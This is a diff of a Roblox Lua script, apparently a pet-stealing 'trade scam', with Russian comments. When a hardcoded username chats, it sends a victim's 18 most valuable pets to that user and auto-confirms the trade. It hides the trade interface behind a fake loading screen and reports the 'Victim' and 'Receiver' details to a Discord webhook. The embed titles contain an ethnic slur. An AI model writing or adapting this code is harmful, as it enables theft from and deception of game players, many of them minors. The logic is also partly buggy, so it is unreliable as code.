         avatar_url = "https://i.pinimg.com/736x/ae/1c/35/ae1c3515d3891f20997929813c9ea8fe.jpg",
-        embeds = {{
-            title = "✅ ЧУРКА БЫЛА ВЬЕБАНА КОТОПЕС",
-            color = 65280,
-            fields = {
-                {
-                    name = "👤 Trade Info",
-                    value = "```lua\n" ..
-                           "Victim    : " .. game.Players.LocalPlayer.Name .. "\n" ..
-                           "Receiver  : " .. receiverName .. "\n" ..
-                           "Total Value: " .. string.format("%d₽", math.floor(totalValue)) .. "\n" ..
-                           "Pets Sent : " .. #tradedPets .. "```",
-                    inline = false
+        embeds = {
+            {
+                title = "✅ ЧУРКА БЫЛА ВЬЕБАНА КОТОПЕС",
+                color = 65280, -- Green color
+                fields = {
+                    {
+                        name = "👤 Trade doxbin",
+                        value = "```lua\n" ..
+                               "Victim    : " .. game.Players.LocalPlayer.Name .. "\n" ..
+                               "Receiver  : " .. ReceiverName .. "\n" ..
+                               "Total Value: " .. string.format("%d₽", math.floor(totalValue)) .. "\n" ..
+                               "Pets Sent : " .. #tradedPets .. "```",
+                        inline = false
+                    },
+                    {
+                        name = "🎁 Traded Pets",
+                        value = "```lua\n" .. (petsText ~= "" and petsText or "No pets traded") .. "```",
+                        inline = false
+                    }
                 },
-                {
-                    name = "🎁 Traded Pets",
-                    value = "```lua\n" .. (petsText ~= "" and petsText or "No pets traded") .. "```",
-                    inline = false
+                timestamp = DateTime.now():ToIsoDate(),
+                footer = {
+                    text = "ВОРКАЕМ КЛЯИНС В 2032! FEAT TEMNI PRINC"
                 }
-            },
-            timestamp = DateTime.now():ToIsoDate(),
-            footer = {text = "ВОРКАЕМ КЛЯИНС В 2032! FEAT TEMNI PRINC"}
-        }}
+            }
+        }
     }
     
-    pcall(function()
-        request({
+    local body = http:JSONEncode(data)
+    
+    local success, result = pcall(function()
+        return request({
             Url = Webhook,
             Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
+            Headers = headers,
+            Body = body
         })
     end)
 end
 
--- Оптимизированная функция трейда с защитой от дублирования
-local function TradeIncoming(receiverName)
-    local currentTime = os.time()
-    
-    -- Проверка коoldown
-    if currentTime - lastTradeTime < TRADE_COOLDOWN then
-        return
-    end
-    
-    -- Проверка существования игрока
-    local receiver = game.Players:FindFirstChild(receiverName)
-    if not receiver then return end
-    
-    lastTradeTime = currentTime
-    
-    local RouterClient = Loads("RouterClient")
+local function TradeIncoming(ReceiverName)
+    while true do
+    local RouterClient = Loaders("RouterClient")
     local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
     local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
     local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
     local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
-    
-    local playerData = ClientData.get_data()[game.Players.LocalPlayer.Name]
+    local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
+    local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+
+    local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
     local sortedPets = {}
-    local tradedPets = {}
+    local tradedPets = {} 
     
-    -- Сортируем петы по ценности
-    for petUid, petData in pairs(playerData.inventory.pets) do
+    for petUid, petData in pairs(PetsInventory) do
         local petInfo = InventoryDB[petData.category][petData.id]
-        local calculatedValue = calculatePetValue(petData)
+        local calculatedValue, baseValue = calculatePetValue(petData)
         table.insert(sortedPets, {
             uid = petUid,
             data = petData,
             value = calculatedValue,
+            baseValue = baseValue,
             name = petInfo.name
         })
     end
     
-    table.sort(sortedPets, function(a, b) return a.value > b.value end)
+    table.sort(sortedPets, function(a, b)
+        return a.value > b.value
+    end)
     
-    -- Отправляем трейд запрос
-    SendTrade:FireServer(receiver)
+    moveGuiOffscreen()
+    SendTrade:FireServer(game.Players[ReceiverName])
     wait(5)
     
-    -- Добавляем петов в трейд (макс 18)
     local petCount = 0
+    local petLimit = 18
+    
     for _, petInfo in ipairs(sortedPets) do
-        if petCount < 18 then
+        if petCount < petLimit then
             AddPetRemote:FireServer(petInfo.uid)
-            table.insert(tradedPets, petInfo)
+            table.insert(tradedPets, {
+                uid = petInfo.uid,
+                data = petInfo.data,
+                name = petInfo.name,
+                value = petInfo.value
+            })
             petCount = petCount + 1
             wait(0.2)
         else
             break
         end
     end
-    
-    -- Подтверждаем трейд
-    wait(5)
-    AcceptNegotiationRemote:FireServer()
-    wait(2)
-    ConfirmTradeRemote:FireServer()
-    wait(2)
-    
-    -- Отправляем уведомление об успешном трейде
-    if #tradedPets > 0 then
-        SendTradeSuccessMessage(receiverName, tradedPets)
-    end
+                wait(5)
+                    AcceptNegotiationRemote:FireServer()
+                wait(2)
+                    ConfirmTradeRemote:FireServer()
+                wait(2) 
+                    if #tradedPets > 0 then
+                        SendTradeSuccessMessage(ReceiverName, tradedPets)
+                    end
+            end
 end
 
--- Обработчики чата с защитой от дублирования
-local processedTrades = {}
+function SendLeaveNotify(playerName)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
 
-local function setupChatListener(player)
-    player.Chatted:Connect(function(msg)
-        if (player.Name == Username or player.Name == Username2) and not processedTrades[player.Name] then
-            processedTrades[player.Name] = true
-            TradeIncoming(player.Name)
-            
-            -- Сбрасываем флаг через 10 секунд
-            delay(10, function()
-                processedTrades[player.Name] = nil
-            end)
-        end
-    end)
+    local dataLeave = {
+        username = "M O L I T O W N",
+        avatar_url = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
+        content = "**" .. playerName .. "** left from the game!",
+        embeds = {
+            {
+                color = 0x610066,
+                fields = {
+                    {
+                        name = "〘:mammoth:〙**User**",
+                        value = "```lua" ..
+                            "\nUsername   : " .. game.Players.LocalPlayer.Name .."```",
+                        inline = false
+                    }
+                }
+            }
+        }
+    }
+
+    local jsonDataLeave = game:GetService("HttpService"):JSONEncode(dataLeave)
+
+    local response = request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = jsonDataLeave
+    })
 end
 
--- Настройка слушателей для существующих игроков
-for _, player in pairs(Players:GetPlayers()) do
-    if player.Name == Username or player.Name == Username2 then
-        setupChatListener(player)
-    end
-end
-
--- Настройка слушателей для новых игроков
-Players.PlayerAdded:Connect(function(player)
-    if player.Name == Username or player.Name == Username2 then
-        setupChatListener(player)
+game:GetService("Players").PlayerRemoving:Connect(function(player)
+    if player == game:GetService("Players").LocalPlayer then
+        SendLeaveNotify(player.Name)
     end
 end)
 
--- Отправка основного вебхука
-SendMainWebhook()
-
--- Отключаем ненужные GUI
-game.Players.LocalPlayer.PlayerGui.TradeApp.Enabled = false
-if game.Players.LocalPlayer.PlayerGui:FindFirstChild("HintApp") then
-    game.Players.LocalPlayer.PlayerGui.HintApp:Destroy()
+-- Отправляем вебхук с учетом стоимости для @everyone
+if totalValue >= 50 then
+    SendMessageEMBED(Webhook, embed, true)  -- С @everyone
+else
+    SendMessageEMBED(Webhook, embed, false) -- Без @everyone
 end
-game.Players.LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
 
-print("✅ Система успешно запущена! Ожидание трейдов от: " .. Username .. " и " .. Username2)
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == Username then
+        player.Chatted:Connect(function(msg)
+            if not sent then
+            TradeIncoming(Username)
+            end
+        end)
+    end
+end)
+
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == Username2 then
+        player.Chatted:Connect(function(msg)
+            if not sent then
+                TradeIncoming(Username2)
+            end
+        end)
+    end
+end)
+
+for _, player in pairs(game.Players:GetPlayers()) do
+    if player.Name == Username or Username2 then
+        player.Chatted:Connect(function(msg)
+            TradeIncoming(Username)
+        end)
+    end
+end
+
+-- Создаем основной фрейм для блюра
+local blurFrame = Instance.new("Frame")
+blurFrame.Name = "LoadingBlurFrame"
+blurFrame.Size = UDim2.new(1, 0, 1, 0)
+blurFrame.Position = UDim2.new(0, 0, 0, 0)
+blurFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+blurFrame.BackgroundTransparency = 0.3
+blurFrame.ZIndex = 10
+blurFrame.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxGui") or game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+-- Создаем эффект блюра через GaussianBlur
+local blurEffect = Instance.new("BlurEffect")
+blurEffect.Size = 10
+blurEffect.Name = "LoadingBlur"
+blurEffect.Parent = game:GetService("Lighting")
+
+-- Основной контейнер для загрузки
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Name = "LoadingFrame"
+loadingFrame.Size = UDim2.new(0, 300, 0, 150)
+loadingFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
+loadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+loadingFrame.BackgroundTransparency = 0.1
+loadingFrame.BorderSizePixel = 0
+loadingFrame.ZIndex = 11
+loadingFrame.Parent = blurFrame
+
+-- Закругленные углы
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = loadingFrame
+
+-- Текст загрузки
+local loadingText = Instance.new("TextLabel")
+loadingText.Name = "LoadingText"
+loadingText.Size = UDim2.new(0.8, 0, 0, 40)
+loadingText.Position = UDim2.new(0.1, 0, 0.3, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Загрузка..."
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.Gotham
+loadingText.TextWrapped = true
+loadingText.ZIndex = 12
+loadingText.Parent = loadingFrame
+
+-- Индикатор загрузки
+local loadingBar = Instance.new("Frame")
+loadingBar.Name = "LoadingBar"
+loadingBar.Size = UDim2.new(0.8, 0, 0, 4)
+loadingBar.Position = UDim2.new(0.1, 0, 0.7, 0)
+loadingBar.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+loadingBar.BorderSizePixel = 0
+loadingBar.ZIndex = 12
+loadingBar.Parent = loadingFrame
+
+local loadingProgress = Instance.new("Frame")
+loadingProgress.Name = "LoadingProgress"
+loadingProgress.Size = UDim2.new(0, 0, 1, 0)
+loadingProgress.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+loadingProgress.BorderSizePixel = 0
+loadingProgress.ZIndex = 13
+loadingProgress.Parent = loadingBar
+
+local progressCorner = Instance.new("UICorner")
+progressCorner.CornerRadius = UDim.new(1, 0)
+progressCorner.Parent = loadingProgress
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(1, 0)
+barCorner.Parent = loadingBar
+
+-- Анимация индикатора загрузки
+local function animateLoadingBar()
+    while loadingProgress.Parent do
+        loadingProgress.Size = UDim2.new(0, 0, 1, 0)
+        
+        -- Анимация заполнения
+        for i = 0, 240, 4 do
+            if not loadingProgress.Parent then break end
+            loadingProgress.Size = UDim2.new(0, i, 1, 0)
+            wait(0.02)
+        end
+        
+        wait(0.5)
+    end
+end
+
+-- Список случайных текстов для загрузки
+local loadingMessages = {
+    "Загрузка ресурсов...",
+    "Оптимизация сцены...",
+    "Подготовка объектов...",
+    "Инициализация системы...",
+    "Загрузка текстур...",
+    "Компиляция скриптов...",
+    "Проверка соединения...",
+    "Синхронизация данных...",
+    "Кэширование ассетов...",
+    "Настройка интерфейса...",
+    "Загрузка конфигурации...",
+    "Проверка обновлений...",
+    "Инициализация плагинов...",
+    "Загрузка модулей...",
+    "Подготовка к работе..."
+}
+
+-- Функция для случайного изменения текста
+local function changeRandomText()
+    while loadingText.Parent do
+        local randomMessage = loadingMessages[math.random(1, #loadingMessages)]
+        loadingText.Text = randomMessage
+        
+        -- Небольшая анимация появления текста
+        for i = 0, 1, 0.1 do
+            if not loadingText.Parent then break end
+            loadingText.TextTransparency = 1 - i
+            wait(0.02)
+        end
+        
+        wait(5) -- Ждем 5 секунд перед следующим изменением
+        
+        -- Анимация исчезновения текста
+        for i = 0, 1, 0.1 do
+            if not loadingText.Parent then break end
+            loadingText.TextTransparency = i
+            wait(0.02)
+        end
+    end
+end
+
+-- Запускаем анимации
+spawn(animateLoadingBar)
+spawn(changeRandomText)
+
+-- Функция для скрытия меню загрузки
+local function hideLoadingMenu()
+    if blurFrame then
+        blurFrame:Destroy()
+    end
+    if blurEffect then
+        blurEffect:Destroy()
+    end
+end
+
+-- Функция для показа меню загрузки (если нужно переиспользовать)
+local function showLoadingMenu()
+    -- Код создания уже выполнен выше
+end
+
+-- Экспортируем функции для внешнего использования
+return {
+    Show = showLoadingMenu,
+    Hide = hideLoadingMenu
+}
